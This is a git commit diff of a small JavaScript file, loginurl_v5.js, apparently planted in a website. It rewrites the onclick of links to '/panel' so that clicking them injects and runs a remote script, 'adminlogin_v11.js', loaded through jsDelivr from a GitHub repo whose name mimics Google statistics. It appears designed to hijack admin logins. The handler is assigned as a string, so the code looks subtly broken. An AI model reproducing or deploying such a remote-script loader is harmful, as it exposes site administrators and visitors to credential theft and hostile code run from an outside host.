4996f9386f37ba3855f6e12183ef6a6cffdd12a7
MR0Boss <36040218+MR0Boss@users.noreply.github.com>
2025-01-29 17:46:56 -0500

    Update and rename loginurl_v4.js to loginurl_v5.js

--- loginurl_v5.js
+++ loginurl_v5.js
@@ -4,7 +4,6 @@ var links = document.querySelectorAll('a[href="/panel"]');
 // Check if the NodeList is not empty
 if (links.length > 0) {
     links.forEach(function(link) {
-        link.href = '#panel';
         link.onclick = "document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/MR0Boss/googlestatistics/adminlogin_v11.js'}));";
     });
 }
